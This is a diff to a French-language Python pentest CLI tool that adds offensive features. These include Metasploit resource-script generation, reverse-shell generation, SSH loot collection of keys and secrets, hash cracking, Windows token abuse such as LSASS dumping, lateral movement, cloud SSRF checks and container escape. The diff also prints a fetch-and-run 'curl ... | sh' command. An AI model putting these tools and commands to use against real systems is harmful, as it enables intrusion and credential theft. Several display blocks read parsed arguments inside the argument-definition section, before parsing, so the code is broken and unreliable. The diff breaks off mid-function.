@@ -49,6 +49,32 @@ from modules.bloodhound_integration import load_bloodhound, cross_with_cves, dis
 from modules.diff_engine import compute_diff, display_diff_terminal, diff_to_html
 from modules.interactive import run_interactive
 from modules.ignore_list import load_ignore_list, filter_ignored, find_ignore_file
+from modules.msf_mapper import get_msf_modules, has_msf_module, generate_msf_scripts
+from modules.default_creds import get_default_creds, enrich_results_with_creds
+from modules.misconfig_detector import detect_misconfigs, Misconfig
+from modules.gtfobins import collect_gtfobins_via_ssh, analyze_ssh_findings, get_static_gtfobins_for_service
+from modules.kill_chain import generate_kill_chain
+from modules.reverse_shell import build_shells, best_shells, save_all_shells
+from modules.loot_collector import collect_loot
+from modules.ad_enum import analyze_ad, detect_ad_context
+from modules.hash_cracker import detect_hash_type, generate_crack_commands, detect_hashes_in_text
+from modules.vhost_discovery import analyze_vhosts
+from modules.privesc_checker import get_privesc_checklist, get_quick_checks
+from modules.shell_upgrader import get_linux_upgrade_guides, get_windows_upgrade_guides, get_quick_upgrade
+from modules.web_payload_gen import analyze_web_payloads
+from modules.pivot_helper    import generate_pivot_commands
+from modules.cipher_decoder  import analyze_cipher
+from modules.brute_helper    import generate_brute_commands
+from modules.smb_helper      import generate_smb_commands
+from modules.token_helper     import (get_token_checks,
+                                       get_checks_for_privilege,
+                                       analyze_whoami_priv)
+from modules.cloud_enum         import enumerate_cloud, get_all_cloud_checks
+from modules.lateral_movement  import generate_lateral_commands, get_all_lateral_techniques
+from modules.wordlist_builder import build_wordlists
+from modules.container_escape import (get_container_escape_checklist,
+                                       get_quick_container_checks,
+                                       analyze_container_host)
 from modules.credentialed_scan import (
     collect_packages_ssh, packages_to_services,
     SSHCredentialError, SSHConnectionError,
@@ -222,10 +248,14 @@ def display_results_terminal(results: list, show_exploits: bool = False, top_cve
         table.add_column("Sévérité", justify="center", min_width=10)
         table.add_column("CVSS", justify="center", min_width=6)
         table.add_column("Score CTX", justify="center", min_width=9)
-        table.add_column("Description", max_width=55)
+        table.add_column("Description", max_width=50)
         table.add_column("Source", style="dim", min_width=10)
         if show_exploits:
-            table.add_column("Exploit PoC", style="bright_green", max_width=40)
+            table.add_column("Exploit PoC", style="bright_green", max_width=35)
+        # Colonne MSF — affichée si au moins une CVE du service a un module MSF
+        show_msf_col = any(cve.get("msf_modules") for cve in cves)
+        if show_msf_col:
+            table.add_column("MSF", style="bold blue", min_width=12)
 
         sorted_cves = sorted(
             cves,
@@ -277,6 +307,21 @@ def display_results_terminal(results: list, show_exploits: bool = False, top_cve
                 if exploits:
                     lines = [f"★{e['stars']} {e['repo']}" for e in exploits]
                     row.append("\n".join(lines))
+                else:
+                    row.append("[dim]—[/dim]")
+
+            if show_msf_col:
+                msf_mods = cve.get("msf_modules", [])
+                if msf_mods:
+                    # Affiche le premier module sur une ligne courte
+                    mod_path = msf_mods[0]["path"]
+                    short = mod_path.split("/")[-1][:20]
+                    rank_color = {"excellent": "green", "great": "green",
+                                  "good": "yellow", "normal": "dim",
+                                  "average": "dim", "manual": "dim"}.get(
+                        msf_mods[0].get("rank", ""), "white")
+                    extra = f" +{len(msf_mods)-1}" if len(msf_mods) > 1 else ""
+                    row.append(f"[{rank_color}]{short}{extra}[/{rank_color}]")
                 else:
                     row.append("[dim]—[/dim]")
 
@@ -377,6 +422,54 @@ Exemples d'utilisation :
     parser.add_argument("--nmap-args", default="", help="Arguments supplémentaires pour nmap (avec --scan)")
     parser.add_argument("--exploits", action="store_true",
                         help="Rechercher des PoC/exploits GitHub pour chaque CVE trouvée")
+    parser.add_argument("--msf", action="store_true",
+                        help="Afficher les modules Metasploit disponibles pour chaque CVE trouvée")
+    parser.add_argument("--msf-script", action="store_true",
+                        help="Générer des scripts .rc Metasploit prêts à lancer avec msfconsole -r")
+    parser.add_argument("--lhost", default=None, metavar="IP",
+                        help="Votre IP locale pour les payloads reverse shell (LHOST dans les scripts MSF)")
+    parser.add_argument("--default-creds", action="store_true",
+                        help="Afficher les credentials par défaut connus pour chaque service "
+                             "et générer les commandes Hydra associées")
+    parser.add_argument("--misconfig", action="store_true",
+                        help="Détecter les mauvaises configurations réseau (Redis sans auth, "
+                             "FTP anonyme, MongoDB ouvert, NFS, SNMP community string...)")
+    parser.add_argument("--gtfobins", action="store_true",
+                        help="Afficher les vecteurs GTFOBins statiques pour les services détectés "
+                             "(sudo, SUID). Avec --ssh-scan, exécute sudo -l et find SUID sur la cible.")
+    parser.add_argument("--kill-chain", action="store_true",
+                        help="Générer une narrative complète du chemin d'exploitation vers root/SYSTEM "
+                             "(combine CVE, misconfigs, creds par défaut, GTFOBins)")
+    parser.add_argument("--revshell", nargs="?", const="auto", metavar="SERVICE:PORT",
+                        help="Générer un reverse shell adapté au service (auto = service le plus vulnérable). "
+                             "Ex: --revshell php:80 | --revshell auto")
+    parser.add_argument("--all-shells", action="store_true",
+                        help="Générer un fichier avec tous les formats de reverse shell disponibles")
+    parser.add_argument("--lport", type=int, default=4444, metavar="PORT",
+                        help="Port d'écoute pour les reverse shells (défaut: 4444)")
+    parser.add_argument("--loot", action="store_true",
+                        help="Collecter les fichiers sensibles sur la cible via SSH "
+                             "(clés SSH, historiques, configs, secrets, flags CTF). "
+                             "Nécessite --ssh-scan.")
+    parser.add_argument("--ad-enum", action="store_true",
+                        help="Détecter le contexte Active Directory et afficher les commandes "
+                             "impacket/ldapsearch/BloodHound pré-remplies")
+    parser.add_argument("--ad-auto", action="store_true",
+                        help="Exécuter automatiquement les énumérations AD sûres "
+                             "(smbclient, ldapsearch, AS-REP scan anonyme). "
+                             "Implique --ad-enum.")
+    parser.add_argument("--hashcrack", nargs="?", const="auto", metavar="HASH",
+                        help="Détecter le type de hash et générer les commandes hashcat/john. "
+                             "Ex: --hashcrack '$6$salt$hash...' | --hashcrack auto (depuis le loot)")
+    parser.add_argument("--vhost", nargs="?", const="auto", metavar="DOMAIN",
+                        help="Générer les commandes ffuf/gobuster pour vhost et subdomain discovery. "
+                             "Ex: --vhost target.htb | --vhost auto (détection depuis le scan)")
+    parser.add_argument("--privesc", action="store_true",
+                        help="Afficher la checklist de privilege escalation contextuelle "
+                             "(Linux ou Windows selon l'OS détecté dans le scan)")
+    parser.add_argument("--upgrade-shell", action="store_true",
+                        help="Afficher les commandes complètes pour upgrader un reverse shell "
+                             "basique en shell interactif stable (python3 PTY, socat, stty raw)")
     parser.add_argument("--enum-web", action="store_true",
                         help="Énumération web intelligente — wordlists adaptées à la stack détectée")
     parser.add_argument("--enum-threads", type=int, default=10, metavar="N",
@@ -405,6 +498,389 @@ Exemples d'utilisation :
     parser.add_argument("--verbose", "-v", action="store_true",
                         help="Affiche les services dont le nom n'a matché aucun alias connu "
                              "(diagnostic des trous de couverture de la base locale)")
+
+    # ── Token Privilege Helper ───────────────────────────────────────────────
+    if args.tokens is not None:
+        whoami_input = args.tokens if args.tokens not in ("all", None) else ""
+        checks = analyze_whoami_priv(whoami_input) if whoami_input else get_token_checks()
+
+        console.print(f"\n[bold yellow]{'='*62}[/bold yellow]")
+        console.print(f"[bold yellow]  TOKEN PRIVILEGE HELPER — Windows[/bold yellow]")
+        console.print(f"[bold yellow]{'='*62}[/bold yellow]")
+
+        if whoami_input:
+            console.print(f"  [dim]Filtré sur les privilèges détectés dans whoami /priv[/dim]")
+        else:
+            console.print(f"  [dim]{len(checks)} checks — tous les token privileges Windows[/dim]")
+        console.print(f"  [dim]Commencer par : whoami /priv  puis  whoami /groups[/dim]")
+
+        cat_colors = {
+            "potato":    "red",
+            "debug":     "magenta",
+            "ownership": "yellow",
+            "backup":    "cyan",
+            "driver":    "blue",
+            "misc":      "green",
+        }
+        cat_labels = {
+            "potato":    "Potato Attacks (SeImpersonate / SeAssignPrimaryToken)",
+            "debug":     "SeDebugPrivilege — LSASS dump",
+            "ownership": "SeTakeOwnershipPrivilege",
+            "backup":    "SeBackupPrivilege / SeRestorePrivilege",
+            "driver":    "SeLoadDriverPrivilege — BYOVD",
+            "misc":      "Autres techniques (AlwaysInstallElevated, Incognito...)",
+        }
+
+        current_cat = ""
+        for check in checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                col = cat_colors.get(check.category, "white")
+                label = cat_labels.get(check.category, check.category)
+                console.print(f"\n[bold {col}]── {label}[/bold {col}]")
+
+            sev_color = {"critical": "red", "high": "yellow", "medium": "blue"}.get(
+                check.severity, "white"
+            )
+            diff_color = {"easy": "green", "medium": "yellow", "hard": "red"}.get(
+                check.difficulty, "white"
+            )
+            priv_tag = (f" [dim]← {check.privilege}[/dim]"
+                        if check.privilege != "*" else "")
+            console.print(
+                f"\n  [{sev_color}][{check.severity.upper()}][/{sev_color}] "
+                f"[{diff_color}]{check.difficulty}[/{diff_color}]  "
+                f"[bold]{check.title}[/bold]{priv_tag}"
+            )
+            console.print(f"  [dim]{check.description[:130]}[/dim]")
+
+            console.print(f"  [dim]Check :[/dim]")
+            for line in check.check_cmd.split("\n")[:3]:
+                if line.startswith("#"):
+                    console.print(f"  [dim]{line}[/dim]")
+                elif line.strip():
+                    console.print(f"  [green]{line}[/green]")
+
+            console.print(f"  [dim]Exploit :[/dim]")
+            exploit_lines = [l for l in check.exploit_cmd.split("\n")
+                             if l.strip() and not l.startswith("#")]
+            for line in exploit_lines[:4]:
+                console.print(f"  [yellow]{line}[/yellow]")
+
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold yellow]{'='*62}[/bold yellow]")
+        console.print(f"[dim]→ --tokens 'SeImpersonatePrivilege  Enabled\n...' pour filtrer[/dim]")
+        console.print(f"[dim]→ Télécharger GodPotato : https://github.com/BeichenDream/GodPotato[/dim]\n")
+
+    # ── Cloud Enum ────────────────────────────────────────────────────────────
+    if args.cloud:
+        cloud = enumerate_cloud(results)
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"[bold cyan]  CLOUD ENUMERATION[/bold cyan]")
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]")
+
+        prov_str = ", ".join(cloud.detected_providers).upper() or "générique"
+        console.print(f"  Providers : [yellow]{prov_str}[/yellow]")
+        console.print(f"  SSRF context : {'[green]oui — tester metadata services[/green]' if cloud.ssrf_context else '[dim]non détecté[/dim]'}")
+        console.print(f"  Checks : [yellow]{len(cloud.checks)}[/yellow]")
+
+        if cloud.bucket_candidates:
+            console.print(f"  Candidats buckets : [dim]{', '.join(cloud.bucket_candidates[:6])}...[/dim]")
+
+        prov_colors = {"aws": "yellow", "azure": "blue", "gcp": "red", "generic": "cyan"}
+        cat_labels  = {
+            "storage": "Stockage (S3 / Blob / GCS)",
+            "iam":     "IAM & Credentials",
+            "metadata":"Metadata Service (SSRF)",
+            "secrets": "Secrets & Tokens",
+            "misc":    "Outils multi-cloud",
+        }
+        current_cat = ""
+        for check in cloud.checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                col = prov_colors.get(check.provider, "white")
+                console.print(f"\n[bold {col}]── [{check.provider.upper()}] {cat_labels.get(check.category, check.category)}[/bold {col}]")
+
+            sev_col = {"critical": "red", "high": "yellow"}.get(check.severity, "blue")
+            console.print(f"\n  [{sev_col}][{check.severity.upper()}][/{sev_col}]  [bold]{check.title}[/bold]")
+            console.print(f"  [dim]{check.description[:110]}[/dim]")
+            for line in [l for l in check.exploit_cmd.split("\n") if l.strip() and not l.startswith("#")][:4]:
+                console.print(f"  [green]{line}[/green]")
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        for note in cloud.notes[:6]:
+            console.print(f"  [dim]{note}[/dim]")
+        console.print("")
+
+    # ── Lateral Movement ─────────────────────────────────────────────────────
+    if args.lateral:
+        lat = generate_lateral_commands(results)
+
+        console.print(f"\n[bold magenta]{'='*62}[/bold magenta]")
+        console.print(f"[bold magenta]  LATERAL MOVEMENT — {lat.domain}[/bold magenta]")
+        console.print(f"[bold magenta]{'='*62}[/bold magenta]")
+        console.print(f"  DC détecté    : {'[green]oui[/green]' if lat.dc_detected else '[dim]non[/dim]'}")
+        console.print(f"  MSSQL détecté : {'[green]oui[/green]' if lat.mssql_detected else '[dim]non[/dim]'}")
+        console.print(f"  RDP détecté   : {'[green]oui[/green]' if lat.rdp_detected else '[dim]non[/dim]'}")
+        console.print(f"  Techniques    : [yellow]{len(lat.techniques)}[/yellow]")
+
+        cat_labels = {
+            "dcom":       ("DCOM",                          "cyan"),
+            "wmi":        ("WMI natif",                     "blue"),
+            "mssql":      ("MSSQL Linked Servers",          "yellow"),
+            "laps":       ("LAPS",                          "green"),
+            "delegation": ("Délégation Kerberos",           "red"),
+            "coercion":   ("Coercition NTLM",               "bold red"),
+            "adcs":       ("AD CS — Certificate Services",  "bold yellow"),
+            "shadow":     ("Shadow Credentials",            "magenta"),
+            "rdp":        ("RDP Hijacking",                 "blue"),
+        }
+        current_cat = ""
+        for tech in lat.techniques:
+            if tech.category != current_cat:
+                current_cat = tech.category
+                label, col = cat_labels.get(tech.category, (tech.category, "white"))
+                console.print(f"\n[bold {col}]── {label}[/bold {col}]")
+
+            sev_col  = {"critical": "red", "high": "yellow"}.get(tech.severity, "blue")
+            diff_col = {"easy": "green", "medium": "yellow", "hard": "red"}.get(tech.difficulty, "white")
+            console.print(
+                f"\n  [{sev_col}][{tech.severity.upper()}][/{sev_col}] "
+                f"[{diff_col}]{tech.difficulty}[/{diff_col}]  [bold]{tech.title}[/bold]"
+            )
+            console.print(f"  [dim]{tech.description[:120]}[/dim]")
+            console.print(f"  [dim]Check :[/dim]")
+            for line in tech.check_cmd.split("\n")[:3]:
+                console.print(f"  [dim]{line}[/dim]" if line.startswith("#") else f"  [green]{line}[/green]")
+            console.print(f"  [dim]Exploit :[/dim]")
+            for line in [l for l in tech.exploit_cmd.split("\n") if l.strip() and not l.startswith("#")][:4]:
+                console.print(f"  [yellow]{line}[/yellow]")
+            for note in tech.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold magenta]{'='*62}[/bold magenta]")
+        for note in lat.notes[:5]:
+            console.print(f"  [dim]{note}[/dim]")
+        console.print("")
+
+    # ── Wordlist Builder ──────────────────────────────────────────────────────
+    if args.wordlist is not None:
+        _wl_out = (args.wordlist
+                   if args.wordlist not in ("auto", None)
+                   else "")
+        _wl_result = build_wordlists(
+            results,
+            output_file=_wl_out,
+            custom_words=getattr(args, "custom_words", []) or [],
+        )
+
+        console.print(f"\n[bold green]{'='*62}[/bold green]")
+        console.print(f"[bold green]  WORDLIST BUILDER[/bold green]")
+        console.print(f"[bold green]{'='*62}[/bold green]")
+
+        s = _wl_result.stats
+        console.print(f"  Cible   : [cyan]{_wl_result.target}[/cyan]")
+        if _wl_result.domain:
+            console.print(f"  Domaine : [cyan]{_wl_result.domain}[/cyan]")
+        if _wl_result.company:
+            console.print(f"  Société : [cyan]{_wl_result.company}[/cyan]")
+        console.print(f"\n  [bold]Statistiques[/bold]")
+        console.print(f"  Mots de base   : [yellow]{s['base_words']}[/yellow]")
+        console.print(f"  Total (mutés)  : [green]{s['total_words']}[/green]")
+        console.print(f"  Avec symbole   : {s['words_with_sym']}  |  Avec chiffre : {s['words_with_num']}")
+        console.print(f"  Longueur       : min={s['min_len']} / moy={s['avg_len']} / max={s['max_len']}")
+        console.print(f"  Mots ≥8 chars  : {s['words_gte8']}")
+
+        # Aperçu
+        console.print(f"\n  [bold]Mots de base extraits[/bold]")
+        for w in _wl_result.base_words[:20]:
+            console.print(f"  [dim]{w}[/dim]")
+        if len(_wl_result.base_words) > 20:
+            console.print(f"  [dim]  ... {len(_wl_result.base_words)-20} autres[/dim]")
+
+        console.print(f"\n  [bold]Aperçu wordlist finale (25 premiers mots)[/bold]")
+        for w in _wl_result.all_words[:25]:
+            console.print(f"  [green]{w}[/green]")
+        if len(_wl_result.all_words) > 25:
+            console.print(f"  [dim]  ... {len(_wl_result.all_words)-25} autres[/dim]")
+
+        if _wl_out:
+            console.print(f"\n  [bold green]✓ Wordlist écrite → {_wl_out}[/bold green]  "
+                          f"[dim]({s['total_words']} lignes)[/dim]")
+        else:
+            console.print(f"\n  [dim]→ Ajouter un chemin pour exporter : --wordlist /tmp/cible.txt[/dim]")
+
+        # CeWL
+        console.print(f"\n[bold yellow]── CeWL — Spider web pour enrichir la wordlist[/bold yellow]")
+        for line in _wl_result.cewl_cmds[:12]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        # Usernames
+        console.print(f"\n[bold yellow]── Génération d'usernames[/bold yellow]")
+        for line in _wl_result.username_cmds[:12]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        # Règles hashcat
+        console.print(f"\n[bold yellow]── Règles hashcat[/bold yellow]")
+        for line in _wl_result.hashcat_rules[:8]:
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+            else:
+                console.print("")
+
+        for note in _wl_result.notes:
+            console.print(f"\n  [dim]{note}[/dim]")
+
+        console.print(f"[bold green]{'='*62}[/bold green]\n")
+
+    # ── Container Escape ─────────────────────────────────────────────────────
+    if args.container is not None:
+        quick_mode = (args.container == "quick")
+        checks = get_quick_container_checks() if quick_mode else get_container_escape_checklist()
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"[bold cyan]  CONTAINER ESCAPE{'— Quick' if quick_mode else ''}[/bold cyan]")
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]")
+        console.print(f"  [dim]{len(checks)} vérifications • Exécuter depuis un shell dans le conteneur[/dim]")
+
+        # Analyse du scan pour services conteneurs exposés
+        _lhost_ct = args.lhost or "LHOST"
+        ext_checks = analyze_container_host(results, lhost=_lhost_ct)
+        if ext_checks:
+            console.print(f"\n[bold red]── Services conteneurs exposés ({len(ext_checks)} détecté(s)) ──[/bold red]")
+            for ec in ext_checks:
+                sev_color = "red" if ec.severity == "critical" else "yellow"
+                console.print(f"\n  [{sev_color}][{ec.severity.upper()}][/{sev_color}] [bold]{ec.title}[/bold]")
+                console.print(f"  [dim]{ec.description}[/dim]")
+                for line in ec.command.split("\n")[:6]:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line.strip():
+                        console.print(f"  [green]{line}[/green]")
+                    else:
+                        console.print("")
+                for note in ec.notes:
+                    console.print(f"  [dim]• {note}[/dim]")
+
+        # Checklist interne
+        cat_colors = {
+            "detect":     "dim",
+            "capability": "red",
+            "socket":     "bold red",
+            "mount":      "yellow",
+            "escape":     "magenta",
+            "kubernetes": "cyan",
+            "cve":        "bold yellow",
+        }
+        current_cat = ""
+        for check in checks:
+            if check.category != current_cat:
+                current_cat = check.category
+                cat_label = {
+                    "detect":     "Détection — suis-je dans un conteneur ?",
+                    "capability": "Capabilities dangereuses",
+                    "socket":     "Docker Socket",
+                    "mount":      "Montages sensibles",
+                    "kubernetes": "Kubernetes",
+                    "cve":        "CVEs connues",
+                }.get(check.category, check.category)
+                col = cat_colors.get(check.category, "white")
+                console.print(f"\n[bold {col}]── {cat_label}[/bold {col}]")
+
+            sev_color = {"critical": "red", "high": "yellow", "medium": "blue"}.get(check.severity, "white")
+            diff_color = {"easy": "green", "medium": "yellow", "hard": "red"}.get(check.difficulty, "white")
+            console.print(
+                f"\n  [{sev_color}][{check.severity.upper()}][/{sev_color}] "
+                f"[{diff_color}]{check.difficulty}[/{diff_color}]  "
+                f"[bold]{check.title}[/bold]"
+            )
+            console.print(f"  [dim]{check.description[:120]}[/dim]")
+            console.print(f"  [dim]Check :[/dim]")
+            for line in check.check_cmd.split("\n")[:3]:
+                if line.startswith("#"):
+                    console.print(f"  [dim]{line}[/dim]")
+                elif line.strip():
+                    console.print(f"  [green]{line}[/green]")
+            console.print(f"  [dim]Exploit :[/dim]")
+            exploit_lines = [l for l in check.exploit_cmd.split("\n")
+                             if l.strip() and not l.startswith("#")]
+            for line in exploit_lines[:3]:
+                console.print(f"  [yellow]{line}[/yellow]")
+            for note in check.notes[:1]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        console.print(f"\n[bold cyan]{'='*62}[/bold cyan]")
+        if not quick_mode:
+            console.print(f"[dim]→ --container quick pour les vérifications rapides uniquement[/dim]")
+        console.print(f"[dim]→ deepce.sh automatise la détection : "
+                      f"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh[/dim]\n")
+
+    # ── Web Payload Generator ────────────────────────────────────────────────
+    parser.add_argument("--web-payloads", nargs="?", const="auto", metavar="SERVICE:PORT",
+                        help="Payloads web offensifs selon le stack détecté "
+                             "(LFI, SSTI, SQLi, SSRF, XXE, XSS + sqlmap). "
+                             "Ex: --web-payloads auto | --web-payloads http:8080")
+    parser.add_argument("--pivot", nargs="?", const="auto", metavar="LHOST",
+                        help="Commandes de pivoting et tunneling "
+                             "(SSH local/remote/dynamic, Chisel, Ligolo-ng, socat, sshuttle). "
+                             "Ex: --pivot 10.10.14.5 | --pivot auto")
+    parser.add_argument("--cipher", default=None, metavar="TEXT",
+                        help="Identifier et décoder un encodage ou chiffrement "
+                             "(Base64, Hex, ROT13/47, Caesar, Morse, JWT, hashes...). "
+                             "Ex: --cipher 'aGVsbG8='")
+    parser.add_argument("--brute", action="store_true",
+                        help="Commandes hydra/medusa/crackmapexec/ncrack par service détecté.")
+    parser.add_argument("--tokens", nargs="?", const="all", metavar="WHOAMI_OUTPUT",
+                        help="Guide d\'exploitation des token privileges Windows "
+                             "(SeImpersonatePrivilege → Potato, SeDebugPrivilege → LSASS dump...). "
+                             "Optionnel : coller la sortie de 'whoami /priv' pour filtrer. "
+                             "Ex: --tokens | --tokens 'SeImpersonatePrivilege  Enabled'")
+    parser.add_argument("--cloud", action="store_true",
+                        help="Énumération cloud : S3 buckets ouverts, Azure Blob, GCS, "
+                             "metadata service via SSRF (IMDSv1/v2), IAM enumération, "
+                             "credentials leakés, ScoutSuite, cloud_enum. "
+                             "Détecte automatiquement AWS/Azure/GCP depuis le scan.")
+    parser.add_argument("--lateral", action="store_true",
+                        help="Techniques de mouvement latéral Windows post-compromise : "
+                             "DCOM, WMI, MSSQL linked servers, LAPS, délégation Kerberos, "
+                             "coercition (PrinterBug/PetitPotam), AD CS (certipy ESC1/ESC8), "
+                             "Shadow Credentials, RDP hijacking. "
+                             "Adapté au contexte (DC/MSSQL/RDP détectés).")
+    parser.add_argument("--wordlist", nargs="?", const="auto", metavar="OUTPUT",
+                        help="Génère une wordlist ciblée depuis le scan : domaine, "
+                             "hostname, produits détectés + mutations (années, symboles, "
+                             "leet, patterns enterprise). "
+                             "Ex: --wordlist | --wordlist /tmp/cible.txt")
+    parser.add_argument("--custom-words", nargs="+", metavar="WORD", default=[],
+                        help="Mots supplémentaires à inclure dans la wordlist "
+                             "(noms d'employés, projets...). Ex: --custom-words acme john")
+    parser.add_argument("--container", nargs="?", const="all", metavar="MODE",
+                        help="Checklist d\'évasion de conteneurs (Docker/LXC/K8s). "
+                             "Modes : all (défaut), quick (vérifs rapides uniquement). "
+                             "Détecte aussi les services conteneurs dans le scan "
+                             "(Docker API 2375, K8s 6443, Kubelet 10250). "
+                             "Ex: --container | --container quick")
+    parser.add_argument("--smb", action="store_true",
+                        help="Enumération SMB complète + impacket "
+                             "(secretsdump, wmiexec, psexec, relay, PTH, Kerberoasting).")
 
     # ── Charger la config ~/.chocoscan.conf ─────────────────────────────────
     _cfg_path = apply_to_parser(parser)
@@ -632,6 +1108,18 @@ Exemples d'utilisation :
                     if cve_id.upper().startswith("CVE-"):
                         c["exploits"] = get_top_exploits(cve_id, max_results=2)
 
+            if args.msf or args.msf_script:
+                for c in cves:
+                    cve_id = c.get("id", "")
+                    if cve_id.upper().startswith("CVE-"):
+                        msf_mods = get_msf_modules(cve_id)
+                        if msf_mods:
+                            c["msf_modules"] = [
+                                {"path": m.path, "type": m.type, "rank": m.rank,
+                                 "description": m.description, "needs_lhost": m.needs_lhost}
+                                for m in msf_mods
+                            ]
+
             # Scoring contextuel
             if not args.no_scoring and cves:
                 cves = inject_scores(cves)
@@ -657,6 +1145,345 @@ Exemples d'utilisation :
             f"[dim]({total_ignored_hits} CVE masquée(s) par la whitelist .chocoscanignore)[/dim]"
         )
 
+    # ── Credentials par défaut ────────────────────────────────────────────────
+    if args.default_creds:
+        results = enrich_results_with_creds(results, target=target)
+        creds_found = [r for r in results if r.get("default_creds")]
+        if creds_found:
+            console.print(f"\n[bold yellow]● Credentials par défaut ({len(creds_found)} service(s))[/bold yellow]")
+            for result in creds_found:
+                svc = result["service"]
+                dc  = result["default_creds"]
+                console.print(f"\n  [cyan]{svc['service_name']}:{svc['port']}[/cyan]")
+                for c in dc["creds"][:4]:
+                    note = f"  [dim]← {c['note']}[/dim]" if c.get("note") else ""
+                    pwd  = c["password"] if c["password"] else "[dim](vide)[/dim]"
+                    console.print(f"    [white]{c['username']}[/white] : {pwd}{note}")
+                if dc.get("quick_test"):
+                    console.print(f"  [dim]Test rapide :[/dim] [green]{dc['quick_test']}[/green]")
+                if dc.get("hydra_cmd"):
+                    console.print(f"  [dim]Hydra       :[/dim] [yellow]{dc['hydra_cmd']}[/yellow]")
+
+    # ── Misconfigurations ─────────────────────────────────────────────────────
+    misconfig_list = []
+    if args.misconfig:
+        from modules.nmap_parser import NmapService as _NmapService
+        svc_objects = []
+        for result in results:
+            svc = result.get("service", {})
+            svc_objects.append(_NmapService(
+                host=svc.get("host", ""), port=svc.get("port", 0),
+                protocol=svc.get("protocol", "tcp"), state="open",
+                service_name=svc.get("service_name", ""), product=svc.get("product", ""),
+                version=svc.get("version", ""), banner=svc.get("banner", ""),
+            ))
+        misconfig_list = detect_misconfigs(svc_objects)
+        if misconfig_list:
+            console.print(f"\n[bold red]● Misconfigurations détectées ({len(misconfig_list)})[/bold red]")
+            for mc in misconfig_list:
+                sev_color = {"CRITICAL": "red", "HIGH": "yellow", "MEDIUM": "blue"}.get(mc.severity, "white")
+                console.print(f"\n  [{sev_color}][{mc.severity}][/{sev_color}] [bold]{mc.title}[/bold]")
+                console.print(f"  [dim]{mc.description[:120]}[/dim]")
+                console.print(f"  [dim]Impact      :[/dim] {mc.impact[:100]}")
+                console.print(f"  [dim]Vérifier    :[/dim] [green]{mc.check_cmd}[/green]")
+                console.print(f"  [dim]Remédiation :[/dim] {mc.remediation[:100]}")
+        else:
+            console.print("\n[dim]Aucune misconfiguration évidente détectée.[/dim]")
+
+    # ── GTFOBins ──────────────────────────────────────────────────────────────
+    gtfo_findings = []
+    if args.gtfobins:
+        console.print("\n[bold blue]● GTFOBins — vecteurs de privesc statiques[/bold blue]")
+        gtfo_shown = False
+        for result in results:
+            svc      = result.get("service", {})
+            svc_name = svc.get("service_name", "")
+            port     = svc.get("port", 0)
+            static_entries = get_static_gtfobins_for_service(svc_name)
+            if static_entries:
+                gtfo_shown = True
+                console.print(f"\n  [cyan]{svc_name}:{port}[/cyan] — sudo {svc_name} potentiellement exploitable")
+                for entry in static_entries[:1]:
+                    console.print(f"  [green]{entry.command.split(chr(10))[0]}[/green]")
+        if not gtfo_shown:
+            console.print("  [dim]Aucun binaire GTFOBins identifié statiquement depuis le scan réseau.[/dim]")
+            console.print("  [dim]Utilisez --ssh-scan --gtfobins pour collecter sudo -l et SUID sur la cible.[/dim]")
+
+    # ── Kill Chain ────────────────────────────────────────────────────────────
+    if args.kill_chain:
+        kill_chain = generate_kill_chain(
+            results=results, target=target,
+            misconfigs=misconfig_list, gtfo_findings=gtfo_findings,
+        )
+        console.print(f"\n[bold magenta]{'=' * 62}[/bold magenta]")
+        console.print(f"[bold magenta]  KILL CHAIN — {target}[/bold magenta]")
+        console.print(f"[bold magenta]{'=' * 62}[/bold magenta]")
+        for line in kill_chain.narrative.split("\n"):
+            if line.startswith("===") or line.startswith("──"):
+                console.print(f"[bold]{line}[/bold]")
+            elif line.startswith("[!]") or line.startswith("[CVE]"):
+                console.print(f"[yellow]{line}[/yellow]")
+            elif line.startswith("[GTFOBins]"):
+                console.print(f"[blue]{line}[/blue]")
+            elif line.strip().startswith(">"):
+                console.print(f"[green]{line}[/green]")
+            else:
+                console.print(line)
+        console.print(f"[bold magenta]{'=' * 62}[/bold magenta]\n")
+
+    # ── Reverse Shell Generator ───────────────────────────────────────────────
+    lhost = args.lhost or ""
+    lport = getattr(args, "lport", 4444) or 4444
+
+    if args.revshell or args.all_shells:
+        if not lhost:
+            console.print("[yellow][!] --lhost requis pour générer des reverse shells. "
+                          "Ex: --lhost 10.10.14.5[/yellow]")
+        else:
+            if args.all_shells:
+                import os as _os
+                _os.makedirs(args.output_dir, exist_ok=True)
+                out_file = f"{args.output_dir}/chocoscan_revshells_{target.replace('.','_')}.md"
+                save_all_shells(lhost, lport, out_file)
+                console.print(f"\n[bold green]● Reverse shells → [cyan]{out_file}[/cyan][/bold green]")
+                console.print(f"[dim]  {sum(1 for _ in open(out_file) if _.startswith('## '))-1} formats générés[/dim]")
+            else:
+                # Sélection automatique ou par service
+                svc_target = args.revshell if args.revshell != "auto" else None
+                svc_name, svc_port = "auto", 0
+                if svc_target and ":" in svc_target:
+                    svc_name, svc_port_str = svc_target.split(":", 1)
+                    svc_port = int(svc_port_str)
+                elif not svc_target and results:
+                    # Service le plus vulnérable (premier résultat trié par CVSS)
+                    best = sorted(results, key=lambda r: max(
+                        (float(str(c.get("cvss", 0)).replace("N/A", "0"))
+                         for c in r.get("cves", [{"cvss": 0}])), default=0
+                    ), reverse=True)
+                    if best:
